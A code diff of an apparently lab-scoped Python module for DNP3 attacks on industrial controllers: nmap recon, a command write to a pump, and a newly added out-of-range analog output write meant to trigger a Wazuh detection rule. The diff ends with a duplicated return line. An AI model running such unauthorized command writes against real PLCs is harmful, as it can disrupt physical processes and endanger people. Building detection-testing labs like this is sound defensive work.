@@ -1,25 +1,15 @@
 #!/usr/bin/env python3
-"""
-Ataques DNP3.  Reconocimiento (nmap) + lectura/escritura con raw sockets.
+"""Ataques DNP3: recon por nmap y lectura/escritura con dnp3_raw.
 
-MITRE ATT&CK for ICS:
-  - T0846 / T0888 Discovery (recon)
-  - T0861 Point & Tag Identification (lectura)
-  - T0855 Unauthorized Command Message (escritura CROB)
-
-Arquitectura dual-mode: igual que s7_snap7. nmap se lanza directamente envuelto
-por `runner.wrap_proxy`; las acciones DNP3 raw se lanzan como subproceso via
-`_cli.dnp3_cli` tambien envuelto por `wrap_proxy` (proxychains en modo empresa).
+nmap va envuelto por wrap_proxy; las acciones DNP3 raw salen vía
+`_cli.dnp3_cli` como subproceso para que proxychains pueda interceptar
+los sockets.
 """
 
 import config
 from core import runner, evidence
 from modules import dnp3_raw
 
-
-# ---------------------------------------------------------------------------
-# Implementacion in-process (la ejecuta el subproceso _cli)
-# ---------------------------------------------------------------------------
 
 _LABELS_BIN = dnp3_raw.LABELS_BIN
 _LABELS_ANA = dnp3_raw.LABELS_ANA
@@ -79,10 +69,6 @@ def _do_write(ip, port, index, value, sink):
     sink("[+] Sesion DNP3 finalizada.")
 
 
-# ---------------------------------------------------------------------------
-# Funciones publicas (dashboard)
-# ---------------------------------------------------------------------------
-
 def discover(target=None, sink=None):
     """nmap -sT -p 20000 <red/ip> (recon DNP3)."""
     target = target or "192.168.40.0/24"
@@ -141,4 +127,34 @@ def write_bomba(target=None, port=None, value=True, sink=None):
                 ["--target", ip, "--port", str(port),
                  "--index", "3", "--value", str(value)],
                 path, sink)
+
+
+def _do_write_analog(ip, port, index, value, sink):
+    sink(f"[*] Conectando a PLC DNP3 en {ip}:{port}...")
+    sink(f"[*] Enviando Direct Operate G41V2 index={index} value={value}...")
+    try:
+        ok = dnp3_raw.dnp3_write_analog_output(
+            ip, int(port), index=int(index), value=int(value),
+            timeout=20, sink=sink)
+    except Exception as e:
+        sink(f"[!] Error en la escritura DNP3 analog: {e}")
+        return
+    if ok:
+        sink(f"[+] G41V2 index={index} value={value}: enviado.")
+    sink("[+] Sesion DNP3 finalizada.")
+
+
+def write_analog(target=None, port=None, index=0, value=50000, sink=None):
+    """Direct Operate G41V2 (Analog Output Int16). Para disparar Wazuh 100410
+    con un valor FUERA del rango habitual aprendido en entrenamiento."""
+    ip = runner.assert_lab_target(target or config.DNP3_DEFAULT_TARGET)
+    port = port or config.DNP3_DEFAULT_PORT
+    path = evidence.new_evidence_file("dnp3", "write_analog")
+    evidence.header(path, f"DNP3 - Analog Output (G41V2) index={index} value={value}",
+                    f"{ip}:{port}", config.MITRE_MAP["dnp3.write_analog_outlier"])
+    _launch_cli("write_analog",
+                ["--target", ip, "--port", str(port),
+                 "--index", str(index), "--value", str(value)],
+                path, sink)
+    return path
     return path
